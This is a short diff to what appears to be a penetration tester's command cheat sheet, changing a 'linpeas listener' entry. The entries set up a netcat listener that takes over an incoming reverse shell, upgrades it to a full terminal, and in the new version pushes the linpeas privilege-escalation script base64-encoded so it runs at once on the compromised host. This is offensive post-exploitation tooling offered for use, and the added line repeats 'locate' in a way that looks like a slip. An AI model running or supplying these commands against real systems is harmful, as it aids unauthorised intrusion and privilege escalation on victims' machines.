@@ -10,8 +10,8 @@ $stabiliser: echo 'script -qc "<shell>" /dev/null#python -c "import pty;pty.spaw
 stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear; echo id;cat) | nc -lvnp <port> && reset
 
 # linpeas listener
-$ linpeas: locate linpeas.sh | tail -n 1
-stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;cat <linpeas>;cat) | nc -lvnp <port> && reset
+$ linpeas: locate linpeas.sh | locate linpeas.sh | grep PEAS | tail -n 1
+stty raw -echo; (echo '<stabiliser>';echo pty;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)";echo export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=<term>;echo alias ll='ls -lsaht'; echo clear;echo "echo $(cat <linpeas> | base64 -w 0) | base64 -d | bash";cat) | nc -lvnp <port> && reset
 
 # pspy listener
 $ writeable_path: echo '/tmp/ /var/tmp/ ~/' | tr ' ' '\n'
